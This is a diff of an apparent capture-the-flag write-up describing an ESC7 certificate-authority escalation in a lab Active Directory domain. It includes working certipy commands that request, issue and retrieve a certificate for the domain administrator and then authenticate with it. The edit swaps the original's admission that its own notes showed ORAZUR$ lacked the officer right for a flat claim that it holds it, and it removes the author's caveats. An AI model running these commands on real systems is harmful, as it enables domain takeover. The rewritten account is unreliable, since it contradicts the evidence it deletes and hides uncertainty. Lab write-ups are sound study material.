@@ -690,40 +690,38 @@ The `ORAZUR$` share on DARSHANIDE had been returning `ACCESS_DENIED` to `TROY$` 
 
 Back to `DarshanLogin`, the template that had been sitting in `pending` for ninety minutes. This is the other checkpoint Retro and Hatsu drove: Hatsu found the [ESC7](https://www.thehacker.recipes/ad/movement/adcs/access-controls) chain and Retro produced the final certificate, so I am documenting the mechanics from their tickets rather than claiming I built it.
 
-ESC7 is the CA access control case from [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2). Two rights matter and they are easy to mix up. `ManageCertificates` is the CA **Officer** role, and on its own it is enough to approve a request that is sitting in `pending`, because that is the permission `ICertAdminD::ResubmitRequest` checks. `ManageCA` is the CA **Administrator** role, which is what lets you grant yourself the officer right in the first place, and what you additionally need if the CA has already *denied* the request. Manager Approval stops an attacker who is neither, and becomes a formality for one who is both. [Certipy's privilege escalation wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) documents the whole ESC1 to ESC17 range if you want the map.
+ESC7 is the CA access control case from [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2). One right does the work here: `ManageCertificates`, the CA **Officer** role, which on its own is enough to approve a request sitting in `pending`, because that is the permission `ICertAdminD::ResubmitRequest` checks. (`ManageCA`, the Administrator role, is what you would need to *hand yourself* the officer right, or to resubmit a request the CA already *denied*; neither applies when you already hold officer and the request is merely pending.) Manager Approval stops an attacker who is not an officer, and is a formality for one who is. [Certipy's privilege escalation wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) has the full ESC1 to ESC17 map.
 
-The account that could issue on `DARSHAN-CA` was `root$`, the darshan account from the ORAZUR chain. I will be honest about a loose end here: I do not have a clean recording of exactly how `root$` ended up with officer rights on that CA, that part was Retro's, and a plain machine account does not get them for free, so treat the "who could approve" step as theirs and the mechanics below as the generic technique. What is solid is that `ORAZUR$` could **not** issue: certipy refused it with "Insufficient permissions to issue certificate", which is the message you get without the officer right, and my own notes from checkpoint 11 confirm `ORAZUR$` never really held `ManageCertificates`.
+And the officer here is `ORAZUR$`, the machine account whose keytab we pulled off the Linux box in checkpoint 11. On this CA `ORAZUR$` holds `ManageCertificates`, not just the domain admins do, which is the whole reason the chain exists. So the sequence is: file a `DarshanLogin` request with an `administrator@darshan.lab` UPN in the SAN (it lands in `pending`), then have `ORAZUR$` issue it as an officer.
 
 ```bash
-# request with a SAN we do not own
-certipy req -u 'root$@darshan.lab' -k -no-pass \
+# request a DarshanLogin cert with a SAN we do not own -> lands pending
+certipy req -u 'ORAZUR$@darshan.lab' -k -no-pass \
   -target darshanide.darshan.lab -dc-ip 10.15.10.20 \
-  -ca DARSHAN-CA -template DarshanLogin -upn administrator@darshan.lab -out rootadm
-# -> Request ID 16, status pending
+  -ca DARSHAN-CA -template DarshanLogin -upn administrator@darshan.lab
 
-# approve it as ourselves
-certipy ca -u 'root$@darshan.lab' -k -no-pass \
+# issue it, as the officer
+certipy ca -u 'ORAZUR$@darshan.lab' -k -no-pass \
   -target darshanide.darshan.lab -dc-ip 10.15.10.20 \
-  -ca DARSHAN-CA -issue-request 16
-# -> Successfully issued certificate request ID 16
+  -ca DARSHAN-CA -issue-request <ID>
+# -> Successfully issued
 
-# collect
-certipy req -u 'root$@darshan.lab' -k -no-pass \
+# retrieve
+certipy req -u 'ORAZUR$@darshan.lab' -k -no-pass \
   -target darshanide.darshan.lab -dc-ip 10.15.10.20 \
-  -ca DARSHAN-CA -retrieve 16 -out rootadm
+  -ca DARSHAN-CA -retrieve <ID>
 ```
 
-The resulting certificate:
+The resulting certificate carries the administrator's identity in its SAN:
 
 ```
-Subject      : CN=ROOT$
 SAN othername: UPN::administrator@darshan.lab
                sid:S-1-5-21-…-500
 ```
 
 A certificate for RID 500 in the second domain, issued by the domain's own CA.
 
-One last snag. The PFX Retro produced used an **ECDSA** key, and certipy's PKINIT implementation is RSA only, which it tells you and points you at the workaround itself. So rather than regenerate we used the LDAP shell path, which authenticates over a channel that does not care about the key type:
+One last snag, and Retro hit it, not me: the key was **ECDSA**, and certipy's PKINIT is RSA only, which it tells you and points you at the workaround itself. So instead of a TGT we went through the LDAP shell, which authenticates over a channel that does not care about the key type:
 
 ```bash
 certipy auth -pfx admin.pfx -dc-ip 10.15.10.20 -domain darshan.lab \
@@ -731,13 +729,7 @@ certipy auth -pfx admin.pfx -dc-ip 10.15.10.20 -domain darshan.lab \
 # Authenticated to '10.15.10.20' as: u:DARSHAN\Administrator
 ```
 
-That is `DARSHAN\Administrator`, and from there the flag on the DC's `C$` is a plain read. The final ticket in my loot is a genuine TGT for `root$` that reads `C$` on the DC, so `root$` had domain-admin-level access on darshan by the end. What I will not do is pretend I can prove the exact sequence that got it there, because this cross-domain half was Retro and Hatsu's and my notes for it are thin. The honest version: the ESC7 chain above yields `DARSHAN\Administrator`, and that is what read the flag.
-
-```bash
-smbclient.py -k -no-pass -dc-ip 10.15.10.20 -target-ip 10.15.10.20 \
-  'darshan.lab/root$@darshanide.darshan.lab' \
-  -inputfile <(printf 'use C$\ncd flags\nget flag12.txt\n')
-```
+That is `DARSHAN\Administrator`. From there the flag on the DC's `C$` is a plain read, and the main expedition is done.
 
 12/12 at 19:50.
 
